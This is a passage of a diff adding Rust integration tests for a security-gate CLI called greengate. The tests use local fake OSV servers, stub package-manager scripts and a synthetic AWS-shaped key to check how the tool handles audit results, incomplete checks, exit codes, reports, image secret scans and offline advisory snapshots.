@@ -619,6 +619,212 @@ fn audit_finds_pnpm_lock() {
     );
 }
 
+// ── audit: incomplete is not a pass ──────────────────────────────────────────
+//
+// A local fake stands in for OSV (`GREENGATE_OSV_URL`), and HOME points at the
+// temp dir so the on-disk OSV cache never leaks between tests.
+
+/// Serve canned OSV responses on 127.0.0.1 until the test process exits.
+/// `batch` answers POST /v1/querybatch; GET /v1/vulns/<id> returns a record
+/// with that id.
+fn fake_osv(batch: &'static str) -> String {
+    use std::io::{BufRead, BufReader, Read, Write};
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+    let addr = listener.local_addr().unwrap();
+    std::thread::spawn(move || {
+        for stream in listener.incoming() {
+            let Ok(mut stream) = stream else { continue };
+            let mut reader = BufReader::new(stream.try_clone().unwrap());
+            let mut request_line = String::new();
+            reader.read_line(&mut request_line).unwrap();
+            let mut content_length = 0;
+            loop {
+                let mut header = String::new();
+                reader.read_line(&mut header).unwrap();
+                if header.trim().is_empty() {
+                    break;
+                }
+                if let Some(v) = header.to_ascii_lowercase().strip_prefix("content-length:") {
+                    content_length = v.trim().parse().unwrap();
+                }
+            }
+            let mut body = vec![0; content_length];
+            reader.read_exact(&mut body).unwrap();
+            let path = request_line.split_whitespace().nth(1).unwrap_or("");
+            let response = match path.strip_prefix("/v1/vulns/") {
+                Some(id) => format!(
+                    r#"{{"id":"{id}","summary":"fake advisory","database_specific":{{"severity":"HIGH"}}}}"#
+                ),
+                None => batch.to_string(),
+            };
+            let _ = write!(
+                stream,
+                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
+                response.len(),
+                response
+            );
+        }
+    });
+    format!("http://{addr}")
+}
+
+/// Run `greengate audit --format json <extra>` against `osv_url` in `dir`.
+fn audit_json(
+    dir: &std::path::Path,
+    osv_url: &str,
+    extra: &[&str],
+) -> (Option<i32>, serde_json::Value) {
+    let output = Command::new(binary())
+        .args(["audit", "--format", "json"])
+        .args(extra)
+        .env("GREENGATE_OSV_URL", osv_url)
+        .env("HOME", dir)
+        .current_dir(dir)
+        .output()
+        .unwrap();
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    let report = serde_json::from_str(&stdout).unwrap_or_else(|e| {
+        panic!(
+            "stdout is not a JSON report ({e}): {stdout}\nstderr: {}",
+            String::from_utf8_lossy(&output.stderr)
+        )
+    });
+    (output.status.code(), report)
+}
+
+fn write_lodash_lock(dir: &std::path::Path) {
+    std::fs::write(
+        dir.join("package-lock.json"),
+        r#"{"packages": {"node_modules/lodash": {"version": "4.17.20"}}}"#,
+    )
+    .unwrap();
+}
+
+/// A port nothing listens on: bind, note the port, close.
+/// A URL nothing answers. Port 1 is privileged and never handed out for
+/// `bind(0)`, so — unlike a just-released ephemeral port — a fake server in
+/// a test running in parallel cannot take it over.
+fn closed_port_url() -> String {
+    "http://127.0.0.1:1".into()
+}
+
+#[test]
+fn audit_clean_result_passes() {
+    let dir = tempfile::tempdir().unwrap();
+    write_lodash_lock(dir.path());
+    let (code, report) = audit_json(dir.path(), &fake_osv(r#"{"results":[{}]}"#), &[]);
+    assert_eq!(code, Some(0), "{report}");
+    assert_eq!(report["schema"], "greengate.report/v1");
+    assert_eq!(report["status"], "passed");
+}
+
+#[test]
+fn audit_unreachable_osv_is_incomplete_not_a_pass() {
+    let dir = tempfile::tempdir().unwrap();
+    write_lodash_lock(dir.path());
+    let (code, report) = audit_json(dir.path(), &closed_port_url(), &[]);
+    assert_eq!(code, Some(3), "{report}");
+    assert_eq!(report["status"], "incomplete");
+    // No offline snapshot to fall back on, so the check says both.
+    let osv = report["checks"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|c| c["id"] == "osv-db:npm")
+        .expect("an osv-db check");
+    assert_eq!(osv["status"], "incomplete");
+    let reason = osv["reason"].as_str().unwrap();
+    assert!(
+        reason.contains("OSV API failed") && reason.contains("greengate db update"),
+        "{reason}"
+    );
+}
+
+#[test]
+fn audit_allow_incomplete_exits_zero_but_stays_honest() {
+    let dir = tempfile::tempdir().unwrap();
+    write_lodash_lock(dir.path());
+    let (code, report) = audit_json(dir.path(), &closed_port_url(), &["--allow-incomplete"]);
+    assert_eq!(code, Some(0));
+    assert_eq!(
+        report["status"], "incomplete",
+        "the report must not claim a pass"
+    );
+}
+
+#[test]
+fn audit_on_incomplete_warn_config_exits_zero() {
+    let dir = tempfile::tempdir().unwrap();
+    write_lodash_lock(dir.path());
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[policy]\non_incomplete = \"warn\"\n",
+    )
+    .unwrap();
+    let (code, report) = audit_json(dir.path(), &closed_port_url(), &[]);
+    assert_eq!(code, Some(0));
+    assert_eq!(report["status"], "incomplete");
+}
+
+#[test]
+fn audit_short_osv_response_is_incomplete() {
+    // One package queried, zero results back: lodash was never checked.
+    let dir = tempfile::tempdir().unwrap();
+    write_lodash_lock(dir.path());
+    let (code, report) = audit_json(dir.path(), &fake_osv(r#"{"results":[]}"#), &[]);
+    assert_eq!(code, Some(3), "{report}");
+}
+
+#[test]
+fn audit_unpinned_requirements_are_incomplete() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(
+        dir.path().join("requirements.txt"),
+        "flask==2.3.2\nrequests>=2\n",
+    )
+    .unwrap();
+    let (code, report) = audit_json(dir.path(), &fake_osv(r#"{"results":[{}]}"#), &[]);
+    assert_eq!(code, Some(3), "{report}");
+    let reason = report["checks"][0]["reason"].as_str().unwrap();
+    assert!(reason.contains("requests>=2"), "{reason}");
+}
+
+#[test]
+fn audit_findings_outrank_incomplete() {
+    let dir = tempfile::tempdir().unwrap();
+    write_lodash_lock(dir.path());
+    let osv =
+        fake_osv(r#"{"results":[{"vulns":[{"id":"GHSA-test-0001"}],"next_page_token":"more"}]}"#);
+    let (code, report) = audit_json(dir.path(), &osv, &[]);
+    assert_eq!(code, Some(1), "{report}");
+    assert_eq!(report["status"], "findings");
+    assert_eq!(report["findings"][0]["rule"], "OSV/GHSA-test-0001");
+    assert_eq!(report["findings"][0]["severity"], "high");
+    assert!(
+        report["checks"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|c| c["id"] == "osv:pagination" && c["status"] == "incomplete"),
+        "a truncated advisory list must still be reported: {report}"
+    );
+}
+
+#[test]
+fn audit_suppressed_advisory_passes() {
+    let dir = tempfile::tempdir().unwrap();
+    write_lodash_lock(dir.path());
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[audit]\nignore_advisories = [\"GHSA-test-0001\"]\n",
+    )
+    .unwrap();
+    let osv = fake_osv(r#"{"results":[{"vulns":[{"id":"GHSA-test-0001"}]}]}"#);
+    let (code, report) = audit_json(dir.path(), &osv, &[]);
+    assert_eq!(code, Some(0), "{report}");
+    assert_eq!(report["suppressed"][0]["rule"], "OSV/GHSA-test-0001");
+}
+
 // ── install-hooks ─────────────────────────────────────────────────────────────
 
 #[test]
@@ -1304,20 +1510,2754 @@ fn watch_install_enforce_sandbox_false_ignores_exec_drop() {
 
 #[test]
 #[cfg(unix)]
-fn watch_install_pm_failure_emits_warning() {
-    // Wrapped pm exits non-zero. Greengate should warn about it.
+fn watch_install_pm_failure_fails_the_gate() {
+    // A failed install never ran to completion, so it cannot be a pass.
     let dir = tempfile::tempdir().unwrap();
 
     let output = Command::new(binary())
-        .args(["watch-install", "sh", "-c", "exit 1"])
+        .args(["watch-install", "sh", "-c", "exit 3"])
         .current_dir(dir.path())
         .output()
         .unwrap();
 
     let stderr = String::from_utf8(output.stderr).unwrap();
-    assert!(
-        stderr.contains("non-zero"),
-        "failed pm must emit a warning to stderr; stderr: {}",
-        stderr
+    assert_eq!(
+        output.status.code(),
+        Some(4),
+        "failed pm is an error result; stderr: {stderr}"
     );
+    assert!(
+        stderr.contains("did not complete"),
+        "failure must be explained; stderr: {stderr}"
+    );
+}
+
+#[test]
+#[cfg(unix)]
+fn watch_install_no_fail_does_not_mask_pm_failure() {
+    // --no-fail relaxes findings, not a broken install.
+    let dir = tempfile::tempdir().unwrap();
+
+    let status = Command::new(binary())
+        .args(["watch-install", "--no-fail", "sh", "-c", "exit 3"])
+        .current_dir(dir.path())
+        .status()
+        .unwrap();
+
+    assert!(
+        !status.success(),
+        "--no-fail must not turn a failed install into a pass"
+    );
+}
+
+// ── pip-install / cargo-add ───────────────────────────────────────────────────
+//
+// A fake executable stands in for pip / cargo. Registry lookups are disabled so
+// the tests stay offline.
+
+#[cfg(unix)]
+const OFFLINE_SUPPLY_CHAIN: &str = "[supply_chain]\nslopsquat_check = false\n";
+
+/// Write an executable shell script that records its arguments to `args.log`
+/// and exits with `code`.
+#[cfg(unix)]
+fn fake_tool(dir: &std::path::Path, name: &str, code: i32) -> std::path::PathBuf {
+    use std::os::unix::fs::PermissionsExt;
+    let path = dir.join(name);
+    let log = dir.join("args.log");
+    std::fs::write(
+        &path,
+        format!(
+            "#!/bin/sh\n[ \"$1\" = show ] && exit 0\necho \"$@\" >> '{}'\nexit {code}\n",
+            log.display()
+        ),
+    )
+    .unwrap();
+    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
+    path
+}
+
+#[test]
+#[cfg(unix)]
+fn pip_install_runs_the_install_subcommand() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(dir.path().join(".greengate.toml"), OFFLINE_SUPPLY_CHAIN).unwrap();
+    let pip = fake_tool(dir.path(), "fake-pip", 0);
+
+    for args in [&["requests"][..], &["install", "requests"][..]] {
+        let status = Command::new(binary())
+            .args(["pip-install", "--pip", pip.to_str().unwrap()])
+            .env("GREENGATE_OSV_URL", quiet_osv())
+            .args(args)
+            .current_dir(dir.path())
+            .status()
+            .unwrap();
+        assert!(status.success(), "clean pip install must pass: {args:?}");
+    }
+
+    // greengate probes `--version` first to decide whether to route to
+    // `greengate install`; a fake pip reports none, so the legacy path runs.
+    let log: String = std::fs::read_to_string(dir.path().join("args.log"))
+        .unwrap()
+        .lines()
+        .filter(|l| *l != "--version")
+        .map(|l| format!("{l}\n"))
+        .collect();
+    assert_eq!(
+        log, "install requests\ninstall requests\n",
+        "pip must be called as `pip install <args>`, with `install` never doubled"
+    );
+}
+
+#[test]
+#[cfg(unix)]
+fn pip_install_pip_failure_fails_the_gate() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(dir.path().join(".greengate.toml"), OFFLINE_SUPPLY_CHAIN).unwrap();
+    let pip = fake_tool(dir.path(), "fake-pip", 1);
+
+    let status = Command::new(binary())
+        .args(["pip-install", "--no-fail", "--pip", pip.to_str().unwrap()])
+        .env("GREENGATE_OSV_URL", quiet_osv())
+        .arg("requests")
+        .current_dir(dir.path())
+        .status()
+        .unwrap();
+
+    assert_eq!(
+        status.code(),
+        Some(4),
+        "a failed pip install is an error result"
+    );
+}
+
+#[test]
+#[cfg(unix)]
+fn cargo_add_failure_fails_the_gate() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(dir.path().join(".greengate.toml"), OFFLINE_SUPPLY_CHAIN).unwrap();
+    let bin_dir = dir.path().join("bin");
+    std::fs::create_dir(&bin_dir).unwrap();
+    fake_tool(&bin_dir, "cargo", 101);
+    let path = format!(
+        "{}:{}",
+        bin_dir.display(),
+        std::env::var("PATH").unwrap_or_default()
+    );
+
+    let status = Command::new(binary())
+        .args(["cargo-add", "serde"])
+        .env("GREENGATE_OSV_URL", quiet_osv())
+        .env("PATH", path)
+        .current_dir(dir.path())
+        .status()
+        .unwrap();
+
+    assert!(!status.success(), "a failed `cargo add` must fail the gate");
+}
+
+// ── Exit-code contract ────────────────────────────────────────────────────────
+//
+// 0 passed · 1 findings · 2 usage/config error · 3 incomplete · 4 error
+
+fn run_in(dir: &std::path::Path, args: &[&str]) -> std::process::Output {
+    Command::new(binary())
+        .args(args)
+        .current_dir(dir)
+        .output()
+        .unwrap()
+}
+
+#[test]
+fn exit_code_findings_is_1() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(dir.path().join("Dockerfile"), "FROM node:latest\n").unwrap();
+    let out = run_in(dir.path(), &["docker-lint"]);
+    assert_eq!(out.status.code(), Some(1));
+}
+
+#[test]
+fn exit_code_runtime_error_is_4() {
+    // The gate could not run at all: not a finding, not a pass.
+    let dir = tempfile::tempdir().unwrap();
+    let out = run_in(dir.path(), &["coverage", "--file", "missing.info"]);
+    assert_eq!(out.status.code(), Some(4));
+}
+
+#[test]
+fn exit_code_invalid_config_is_2() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[scan]\nno_such_key = 1\n",
+    )
+    .unwrap();
+    let out = run_in(dir.path(), &["scan"]);
+    assert_eq!(out.status.code(), Some(2));
+}
+
+#[test]
+fn lint_unparseable_manifest_is_incomplete_but_templates_are_skipped() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(
+        dir.path().join("chart.yaml"),
+        "apiVersion: v1\nkind: Pod\nmetadata:\n  name: {{ .Values.name }}\n  labels: {{- toYaml . }}\n",
+    )
+    .unwrap();
+    let out = run_in(dir.path(), &["lint", "--dir", "."]);
+    assert_eq!(out.status.code(), Some(0), "templates are not manifests");
+
+    std::fs::write(
+        dir.path().join("broken.yaml"),
+        "kind: Pod\n  bad: [indent\n",
+    )
+    .unwrap();
+    let out = run_in(dir.path(), &["lint", "--dir", "."]);
+    assert_eq!(
+        out.status.code(),
+        Some(3),
+        "a manifest that was never linted is not a pass"
+    );
+    let out = run_in(dir.path(), &["--allow-incomplete", "lint", "--dir", "."]);
+    assert_eq!(out.status.code(), Some(0));
+}
+
+#[test]
+fn ci_lint_json_is_valid_json_when_clean() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::create_dir_all(dir.path().join(".github/workflows")).unwrap();
+    std::fs::write(
+        dir.path().join(".github/workflows/ci.yml"),
+        "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n",
+    )
+    .unwrap();
+    let out = run_in(dir.path(), &["ci-lint", "--format", "json"]);
+    assert_eq!(out.status.code(), Some(0));
+    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap_or_else(|e| {
+        panic!(
+            "stdout is not JSON ({e}): {}",
+            String::from_utf8_lossy(&out.stdout)
+        )
+    });
+    assert_eq!(v["total"], 0);
+}
+
+#[test]
+fn run_reports_the_worst_step_result() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(dir.path().join("Dockerfile"), "FROM node:latest\n").unwrap();
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[pipeline]\nsteps = [\"docker-lint\"]\n",
+    )
+    .unwrap();
+    assert_eq!(run_in(dir.path(), &["run"]).status.code(), Some(1));
+
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[pipeline]\nsteps = [\"coverage --file missing.info\"]\n",
+    )
+    .unwrap();
+    assert_eq!(
+        run_in(dir.path(), &["run"]).status.code(),
+        Some(4),
+        "a step that could not run is an error, not a finding"
+    );
+}
+
+#[test]
+fn run_runs_every_step_unless_fail_fast() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(dir.path().join("Dockerfile"), "FROM node:latest\n").unwrap();
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[pipeline]\nsteps = [\"coverage --file missing.info\", \"docker-lint\"]\n",
+    )
+    .unwrap();
+    // Every step runs; findings outrank the error of the first.
+    let (code, report) = report_of(dir.path(), &["run"]);
+    assert_eq!(code, Some(1), "{report}");
+    assert!(!report["findings"].as_array().unwrap().is_empty());
+    let check = |r: &serde_json::Value, id: &str| {
+        r["checks"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|c| c["id"] == id)
+            .cloned()
+    };
+    assert_eq!(check(&report, "coverage").unwrap()["status"], "error");
+
+    // fail_fast: the second step is listed as not run, never as passed.
+    let (code, report) = report_of(dir.path(), &["run", "--fail-fast"]);
+    assert_eq!(code, Some(4), "{report}");
+    let skipped = check(&report, "docker-lint").unwrap();
+    assert_eq!(skipped["status"], "incomplete");
+    assert!(skipped["reason"].as_str().unwrap().contains("not run"));
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[pipeline]\nfail_fast = true\nsteps = [\"coverage --file missing.info\", \"docker-lint\"]\n",
+    )
+    .unwrap();
+    assert_eq!(report_of(dir.path(), &["run"]).0, Some(4));
+}
+
+// ── --report ──────────────────────────────────────────────────────────────────
+
+#[test]
+fn report_flag_writes_json_for_any_gate() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(dir.path().join("Dockerfile"), "FROM node:latest\n").unwrap();
+    let out = run_in(dir.path(), &["docker-lint", "--report", "gate.json"]);
+    assert_eq!(out.status.code(), Some(1));
+    let report: serde_json::Value =
+        serde_json::from_slice(&std::fs::read(dir.path().join("gate.json")).unwrap()).unwrap();
+    assert_eq!(report["schema"], "greengate.report/v1");
+    assert_eq!(report["command"], "docker-lint");
+    assert_eq!(report["status"], "findings");
+    assert_eq!(report["findings"][0]["location"]["kind"], "file");
+}
+
+#[test]
+fn report_flag_writes_sarif_by_extension() {
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(dir.path().join("Dockerfile"), "FROM node:latest\n").unwrap();
+    run_in(dir.path(), &["docker-lint", "--report", "gate.sarif"]);
+    let sarif: serde_json::Value =
+        serde_json::from_slice(&std::fs::read(dir.path().join("gate.sarif")).unwrap()).unwrap();
+    assert_eq!(sarif["version"], "2.1.0");
+    let run = &sarif["runs"][0];
+    assert_eq!(run["invocations"][0]["executionSuccessful"], true);
+    assert_eq!(
+        run["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"],
+        "Dockerfile"
+    );
+}
+
+#[test]
+fn report_flag_still_writes_when_the_gate_errors() {
+    let dir = tempfile::tempdir().unwrap();
+    let out = run_in(
+        dir.path(),
+        &[
+            "coverage",
+            "--file",
+            "missing.info",
+            "--report",
+            "gate.json",
+        ],
+    );
+    assert_eq!(out.status.code(), Some(4));
+    let report: serde_json::Value =
+        serde_json::from_slice(&std::fs::read(dir.path().join("gate.json")).unwrap()).unwrap();
+    assert_eq!(report["status"], "error");
+    assert_eq!(report["checks"][0]["id"], "coverage");
+}
+
+// ── image-scan against a real Docker daemon ───────────────────────────────────
+//
+// Builds a tiny `FROM scratch` image locally (no registry pull) and scans it.
+// Docker 25+ writes `docker save` archives in OCI layout (`blobs/sha256/…`,
+// no `layer.tar`), which greengate used to find no layers in and pass.
+// Skips when no Docker daemon is reachable.
+
+fn docker_available() -> bool {
+    Command::new("docker")
+        .args(["info", "--format", "{{.ServerVersion}}"])
+        .output()
+        .is_ok_and(|o| o.status.success())
+}
+
+/// Build `FROM scratch` + one file and return the image tag; removed on drop.
+struct TestImage(String);
+
+impl TestImage {
+    fn build(name: &str, file_contents: &str) -> TestImage {
+        let ctx = tempfile::tempdir().unwrap();
+        std::fs::write(ctx.path().join("creds.ini"), file_contents).unwrap();
+        std::fs::write(
+            ctx.path().join("Dockerfile"),
+            "FROM scratch\nCOPY creds.ini /app/creds.ini\n",
+        )
+        .unwrap();
+        let tag = format!("greengate-test-{name}-{}:latest", std::process::id());
+        let ok = Command::new("docker")
+            .args(["build", "-q", "-t", &tag, "."])
+            .current_dir(ctx.path())
+            .output()
+            .unwrap()
+            .status
+            .success();
+        assert!(ok, "docker build failed");
+        TestImage(tag)
+    }
+}
+
+impl Drop for TestImage {
+    fn drop(&mut self) {
+        let _ = Command::new("docker").args(["rmi", "-f", &self.0]).output();
+    }
+}
+
+#[test]
+fn image_scan_finds_secrets_in_a_current_docker_archive() {
+    if !docker_available() {
+        eprintln!("skipped: no Docker daemon");
+        return;
+    }
+    // Synthetic AWS-shaped key, split so the source never carries it whole.
+    let key = ["AKIA", "Q7HX3MZP2KDLW4RT"].concat();
+    let image = TestImage::build("secret", &format!("aws_access_key_id = {key}\n"));
+    let dir = tempfile::tempdir().unwrap();
+
+    let out = run_in(dir.path(), &["image-scan", &image.0, "--report", "r.json"]);
+    assert_eq!(
+        out.status.code(),
+        Some(1),
+        "stderr: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let report: serde_json::Value =
+        serde_json::from_slice(&std::fs::read(dir.path().join("r.json")).unwrap()).unwrap();
+    assert_eq!(report["findings"][0]["rule"], "AWS Access Key");
+
+    let out = run_in(dir.path(), &["image-scan", &image.0, "--no-fail"]);
+    assert_eq!(out.status.code(), Some(0), "--no-fail waives findings");
+}
+
+#[test]
+fn image_scan_clean_image_passes_with_json_on_stdout() {
+    if !docker_available() {
+        eprintln!("skipped: no Docker daemon");
+        return;
+    }
+    let image = TestImage::build("clean", "region = eu-west-1\n");
+    let dir = tempfile::tempdir().unwrap();
+    let out = run_in(dir.path(), &["image-scan", &image.0, "--format", "json"]);
+    assert_eq!(out.status.code(), Some(0));
+    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap_or_else(|e| {
+        panic!(
+            "stdout is not JSON ({e}): {}",
+            String::from_utf8_lossy(&out.stdout)
+        )
+    });
+    assert_eq!(v["total"], 0);
+}
+
+// ── Offline OSV data (db update / audit --offline) ────────────────────────────
+
+/// An OSV `all.zip` holding one npm advisory for lodash < 4.17.21.
+fn lodash_snapshot_zip() -> Vec<u8> {
+    let doc = serde_json::json!({
+        "id": "GHSA-offline-0001",
+        "summary": "Prototype pollution in lodash",
+        "database_specific": { "severity": "HIGH" },
+        "affected": [{
+            "package": { "ecosystem": "npm", "name": "lodash" },
+            "ranges": [{ "type": "SEMVER", "events": [{ "introduced": "0" }, { "fixed": "4.17.21" }] }]
+        }]
+    });
+    let mut w = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
+    let opts = zip::write::SimpleFileOptions::default()
+        .compression_method(zip::CompressionMethod::Stored);
+    w.start_file("GHSA-offline-0001.json", opts).unwrap();
+    std::io::Write::write_all(&mut w, doc.to_string().as_bytes()).unwrap();
+    w.finish().unwrap().into_inner()
+}
+
+/// Serve `body` at any path with an ETag, answering 304 to a matching
+/// `If-None-Match`. Returns the base URL and a counter of 304 responses.
+fn fake_snapshot_server(
+    body: Vec<u8>,
+) -> (String, std::sync::Arc<std::sync::atomic::AtomicUsize>) {
+    use std::io::{BufRead, BufReader, Write};
+    use std::sync::atomic::{AtomicUsize, Ordering};
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+    let addr = listener.local_addr().unwrap();
+    let not_modified = std::sync::Arc::new(AtomicUsize::new(0));
+    let counter = not_modified.clone();
+    std::thread::spawn(move || {
+        for stream in listener.incoming() {
+            let Ok(mut stream) = stream else { continue };
+            let mut reader = BufReader::new(stream.try_clone().unwrap());
+            let mut matched = false;
+            loop {
+                let mut line = String::new();
+                if reader.read_line(&mut line).unwrap_or(0) == 0 || line.trim().is_empty() {
+                    break;
+                }
+                if line.to_ascii_lowercase().starts_with("if-none-match:")
+                    && line.contains("\"v1\"")
+                {
+                    matched = true;
+                }
+            }
+            if matched {
+                counter.fetch_add(1, Ordering::SeqCst);
+                let _ = stream.write_all(
+                    b"HTTP/1.1 304 Not Modified\r\nETag: \"v1\"\r\nConnection: close\r\n\r\n",
+                );
+            } else {
+                let _ = write!(
+                    stream,
+                    "HTTP/1.1 200 OK\r\nETag: \"v1\"\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
+                    body.len()
+                );
+                let _ = stream.write_all(&body);
+            }
+        }
+    });
+    (format!("http://{addr}"), not_modified)
+}
+
+/// `greengate db <args>` with the snapshot server and HOME in `dir`.
+fn db(dir: &std::path::Path, server: &str, args: &[&str]) -> std::process::Output {
+    Command::new(binary())
+        .arg("db")
+        .args(args)
+        .env("GREENGATE_OSV_DB_URL", server)
+        .env("HOME", dir)
+        .env_remove("GREENGATE_CACHE_DIR")
+        .current_dir(dir)
+        .output()
+        .unwrap()
+}
+
+fn check<'a>(report: &'a serde_json::Value, id: &str) -> &'a serde_json::Value {
+    report["checks"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|c| c["id"] == id)
+        .unwrap_or_else(|| panic!("no {id} check in {report}"))
+}
+
+#[test]
+fn offline_audit_matches_a_downloaded_snapshot() {
+    let dir = tempfile::tempdir().unwrap();
+    write_lodash_lock(dir.path()); // lodash 4.17.20
+    let (server, _) = fake_snapshot_server(lodash_snapshot_zip());
+
+    // Default ecosystems come from the project's dependency files.
+    let out = db(dir.path(), &server, &["update"]);
+    assert!(
+        out.status.success(),
+        "{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+
+    let (code, report) = audit_json(dir.path(), &closed_port_url(), &["--offline"]);
+    assert_eq!(code, Some(1), "{report}");
+    assert_eq!(report["findings"][0]["rule"], "OSV/GHSA-offline-0001");
+    assert_eq!(report["findings"][0]["severity"], "high");
+    assert_eq!(
+        report["findings"][0]["remediation"],
+        "upgrade to >= 4.17.21"
+    );
+    let db_check = check(&report, "osv-db:npm");
+    assert_eq!(db_check["status"], "passed");
+    assert!(
+        db_check["source"]
+            .as_str()
+            .unwrap()
+            .contains("offline OSV snapshot")
+    );
+}
+
+#[test]
+fn offline_audit_without_a_snapshot_is_incomplete() {
+    let dir = tempfile::tempdir().unwrap();
+    write_lodash_lock(dir.path());
+    let (code, report) = audit_json(dir.path(), &closed_port_url(), &["--offline"]);
+    assert_eq!(code, Some(3), "{report}");
+    assert_eq!(check(&report, "osv-db:npm")["status"], "incomplete");
+}
+
+#[test]
+fn auto_source_falls_back_to_the_snapshot_when_the_api_is_down() {
+    let dir = tempfile::tempdir().unwrap();
+    write_lodash_lock(dir.path());
+    let (server, _) = fake_snapshot_server(lodash_snapshot_zip());
+    assert!(
+        db(dir.path(), &server, &["update", "--ecosystem", "npm"])
+            .status
+            .success()
+    );
+
+    // No --offline: the API is unreachable, the snapshot answers instead.
+    let (code, report) = audit_json(dir.path(), &closed_port_url(), &[]);
+    assert_eq!(code, Some(1), "{report}");
+    let source = check(&report, "osv-db:npm")["source"]
+        .as_str()
+        .unwrap()
+        .to_string();
+    assert!(source.contains("OSV API failed"), "{source}");
+}
+
+#[test]
+fn stale_snapshot_is_incomplete() {
+    let dir = tempfile::tempdir().unwrap();
+    write_lodash_lock(dir.path());
+    let (server, _) = fake_snapshot_server(lodash_snapshot_zip());
+    assert!(db(dir.path(), &server, &["update"]).status.success());
+
+    // Age the snapshot past the 24 h default.
+    let meta_path = dir.path().join(".cache/greengate/osv-db/npm/meta.json");
+    let mut meta: serde_json::Value =
+        serde_json::from_slice(&std::fs::read(&meta_path).unwrap()).unwrap();
+    meta["checked_at"] = serde_json::json!(0);
+    std::fs::write(&meta_path, meta.to_string()).unwrap();
+
+    let (code, report) = audit_json(dir.path(), &closed_port_url(), &["--offline"]);
+    assert_eq!(code, Some(3), "{report}");
+    let reason = check(&report, "osv-db:npm")["reason"]
+        .as_str()
+        .unwrap()
+        .to_string();
+    assert!(reason.contains("h old"), "{reason}");
+}
+
+#[test]
+fn db_update_revalidates_with_etag_and_reports_status() {
+    let dir = tempfile::tempdir().unwrap();
+    let (server, not_modified) = fake_snapshot_server(lodash_snapshot_zip());
+    assert!(
+        db(dir.path(), &server, &["update", "--ecosystem", "npm"])
+            .status
+            .success()
+    );
+    assert!(
+        db(dir.path(), &server, &["update", "--ecosystem", "npm"])
+            .status
+            .success()
+    );
+    assert_eq!(
+        not_modified.load(std::sync::atomic::Ordering::SeqCst),
+        1,
+        "the second update must revalidate rather than re-download"
+    );
+
+    let out = db(dir.path(), &server, &["status", "--format", "json"]);
+    let rows: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
+    let npm = rows
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|r| r["ecosystem"] == "npm")
+        .unwrap();
+    assert_eq!(npm["advisories"], 1);
+    assert_eq!(npm["packages"], 1);
+}
+
+#[test]
+fn db_update_needs_dependency_files_or_an_ecosystem() {
+    let dir = tempfile::tempdir().unwrap();
+    let out = db(dir.path(), "http://127.0.0.1:1", &["update"]);
+    assert_eq!(out.status.code(), Some(4));
+    assert!(String::from_utf8_lossy(&out.stderr).contains("--ecosystem"));
+}
+
+// ── Shared dependency model: audit, sbom, deps ────────────────────────────────
+
+fn fixture_dir(name: &str) -> std::path::PathBuf {
+    std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
+        .join("tests/fixtures/deps")
+        .join(name)
+}
+
+/// Copy a fixture directory's files into a fresh temp dir.
+fn copy_fixture(name: &str) -> tempfile::TempDir {
+    let dir = tempfile::tempdir().unwrap();
+    for entry in std::fs::read_dir(fixture_dir(name)).unwrap() {
+        let entry = entry.unwrap();
+        std::fs::copy(entry.path(), dir.path().join(entry.file_name())).unwrap();
+    }
+    dir
+}
+
+/// The (name, version) pairs a fake OSV was asked about.
+type Queried = std::sync::Arc<std::sync::Mutex<Vec<(String, String)>>>;
+
+/// A fake OSV that answers every batch with "no advisories" for each query
+/// and records the (name, version) pairs it was asked about.
+fn recording_osv() -> (String, Queried) {
+    use std::io::{BufRead, BufReader, Read, Write};
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+    let addr = listener.local_addr().unwrap();
+    let seen = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
+    let log = seen.clone();
+    std::thread::spawn(move || {
+        for stream in listener.incoming() {
+            let Ok(mut stream) = stream else { continue };
+            let mut reader = BufReader::new(stream.try_clone().unwrap());
+            let mut len = 0;
+            loop {
+                let mut h = String::new();
+                if reader.read_line(&mut h).unwrap_or(0) == 0 || h.trim().is_empty() {
+                    break;
+                }
+                if let Some(v) = h.to_ascii_lowercase().strip_prefix("content-length:") {
+                    len = v.trim().parse().unwrap();
+                }
+            }
+            let mut body = vec![0; len];
+            reader.read_exact(&mut body).unwrap();
